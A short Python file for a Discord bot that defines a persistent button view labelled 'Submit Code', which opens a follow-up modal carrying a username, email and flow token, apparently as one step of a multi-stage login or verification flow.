import discord
from discord import ui

from views.modals.modal_two import MyModalTwo

class ButtonViewTwo(ui.View):
    def __init__(self, username:str, email: str, flowtoken: str):
        super().__init__(timeout=None)
        self.username = username
        self.email = email
        self.flowtoken = flowtoken

    @discord.ui.button(label="✅Submit Code", style=discord.ButtonStyle.green, custom_id="persistent:button_two")
    async def button_two(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(
            MyModalTwo(
                self.username,
                self.email,
                self.flowtoken
            )
        )
